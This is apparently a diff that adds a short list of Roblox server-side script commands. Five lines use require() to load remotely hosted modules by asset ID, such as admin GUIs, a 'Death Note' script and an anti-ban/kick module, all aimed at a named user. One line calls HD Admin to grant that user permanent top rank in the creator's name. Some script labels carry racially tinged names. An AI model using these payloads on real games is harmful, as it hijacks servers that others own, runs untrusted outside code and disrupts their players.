@@ -1,0 +1,6 @@
+require(4815243731):UTG("yofriendfromschool12") - blackmans gui
+require(2919647358):Fire("yofriendfromschool12") - Death Note
+require(4799156637).Lmao("yofriendfromschool12") - UTG Fanmade
+require(3677481469).load("yofriendfromschool12") - Indian shoe store
+require(3688625160).load("Nice try m8",{"yofriendfromschool12"}) Anti Ban/Kick
+_G.HDAdminMain:GetModule("cf"):SetRank(game:GetService("Players")["yofriendfromschool12"], game.CreatorId, 5, "Perm") HD PERM Admin
